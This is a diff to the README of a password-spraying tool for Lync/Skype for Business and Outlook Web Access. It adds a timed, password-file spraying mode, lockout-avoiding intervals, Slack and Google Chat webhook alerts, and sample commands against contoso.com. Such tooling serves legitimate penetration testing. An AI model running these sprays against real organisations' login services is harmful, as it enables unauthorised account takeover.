@@ -27,6 +27,7 @@ A blazing fast password sprayer for Lync/Skype For Business and OWA, built on As
 ```
 Usage:
     atomizer (lync|owa) <target> <password> <userfile> [--threads THREADS] [--debug]
+    atomizer (lync|owa) <target> <passwordfile> <userfile> --interval <TIME> [--gchat <URL>] [--slack <URL>][--threads THREADS] [--debug]
     atomizer (lync|owa) <target> --csvfile CSVFILE [--user-row-name NAME] [--pass-row-name NAME] [--threads THREADS] [--debug]
     atomizer (lync|owa) <target> --user-as-pass USERFILE [--threads THREADS] [--debug]
     atomizer (lync|owa) <target> --recon [--debug]
@@ -34,17 +35,21 @@ Usage:
     atomizer -v | --version
 
 Arguments:
-    target     target domain or url
-    password   password to spray
-    userfile   file containing usernames (one per line)
+    target         target domain or url
+    password       password to spray
+    userfile       file containing usernames (one per line)
+    passwordfile   file containing passwords (one per line)
 
 Options:
     -h, --help               show this screen
     -v, --version            show version
     -c, --csvfile CSVFILE    csv file containing usernames and passwords
+    -i, --interval TIME      spray at the specified interval [format: "H:M:S"]
     -t, --threads THREADS    number of concurrent threads to use [default: 3]
     -d, --debug              enable debug output
     --recon                  only collect info, don't password spray
+    --gchat URL              gchat webhook url for notification
+    --slack URL              slack webhook url for notification
     --user-row-name NAME     username row title in CSV file [default: Email Address]
     --pass-row-name NAME     password row title in CSV file [default: Password]
     --user-as-pass USERFILE  use the usernames in the specified file as the password (one per line)
@@ -70,6 +75,10 @@ python atomizer lync contoso.com --user-as-pass usernames.txt
 
 ```bash
 python atomizer owa 'https://owa.contoso.com/autodiscover/autodiscover.xml' --recon
+```
+
+```bash
+python atomizer.py owa contoso.com passwords.txt emails.txt -i 0:45:00 --gchat <GCHAT_WEBHOOK_URL>
 ```
 
 ### Vaporizer
